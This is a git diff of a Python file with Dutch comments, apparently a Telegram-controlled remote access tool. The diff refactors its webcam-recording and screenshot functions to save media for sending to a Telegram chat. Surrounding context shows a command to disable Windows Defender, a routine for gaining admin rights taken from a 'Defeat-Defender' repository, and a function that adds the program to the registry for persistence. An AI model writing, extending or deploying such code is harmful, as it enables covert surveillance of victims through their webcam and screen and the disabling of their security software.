@@ -59,17 +59,26 @@ Command Lijst:
 /stopdefender   -   Windows Defender uitgeschakelen
 """
 
+# path en naam voor het opslaan van media
+def save_media_to(filename_prefix, extension) -> str:
+    """
+    Maakt de map aan (als die nog niet bestaat) en genereert een uniek bestandsnaam + pad.
+    
+    Args:
+        filename_prefix (str): Voorvoegsel van de bestandsnaam, bijv. "screenshot" of "video"
+        extension (str): Bestandsextensie, bijv. "png" of "mp4"
+    
+    Returns:
+        str: Volledige pad naar het bestand
+    """
+    os.makedirs("./media", exist_ok=True)
+    filename = f"{filename_prefix}.{extension}"
+    return os.path.join("./media", filename)
 
 # maak een video recording met de webcam
 # source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
 def get_camRecording():
-    # folder waar de video opgeslagen wordt
-    save_dir = './media'
-    os.makedirs(save_dir, exist_ok=True)
-
-    # Bestandsnaam en opslagpad aangeven
-    filename = 'output.mp4'
-    filepath = os.path.join(save_dir, filename)
+    videoPath = save_media_to("cam", "mp4")
 
     # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
     cam = cv2.VideoCapture(0)
@@ -82,12 +91,11 @@ def get_camRecording():
     frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
     frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
 
-    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/video folder
+    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/media folder
     fourcc = cv2.VideoWriter_fourcc(*'avc1')
-    out = cv2.VideoWriter(filepath, fourcc, 20.0, (frame_width, frame_height))
+    out = cv2.VideoWriter(videoPath, fourcc, 20.0, (frame_width, frame_height))
 
     # zolang de whileloop true is wordt webcam gebruikt om video te maken
-
     start_time = time.time()
     while True:
         ret, frame = cam.read()
@@ -103,9 +111,17 @@ def get_camRecording():
     out.release()
     cv2.destroyAllWindows()
 
-    # return de video/filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
-    return filepath
+    # return de video filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
+    return videoPath
 
+
+# Maak een screenshot van het scherm
+def get_screen():
+    imagePath = save_media_to("screenshot", "png")
+    screenshot = ImageGrab.grab()
+    screenshot.save(imagePath, "PNG")
+
+    return "screenshot gemaakt"
 
 # functie om admin rechten aan te zetten
 # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
@@ -151,16 +167,3 @@ def add_to_registry(program_name):
         print(f"Fout bij toevoegen aan het register: {e}")
 
 
-# Maak een screenshot van het scherm
-def get_screen():
-    save_dir = './media'
-    os.makedirs(save_dir, exist_ok=True)
-
-    # Bestandsnaam en opslagpad
-    filename = 'screenshot.png'
-    filepath = os.path.join(save_dir, filename)
-
-    screenshot = ImageGrab.grab()
-    screenshot.save(filepath, "PNG")
-
-    return "screenshot gemaakt"
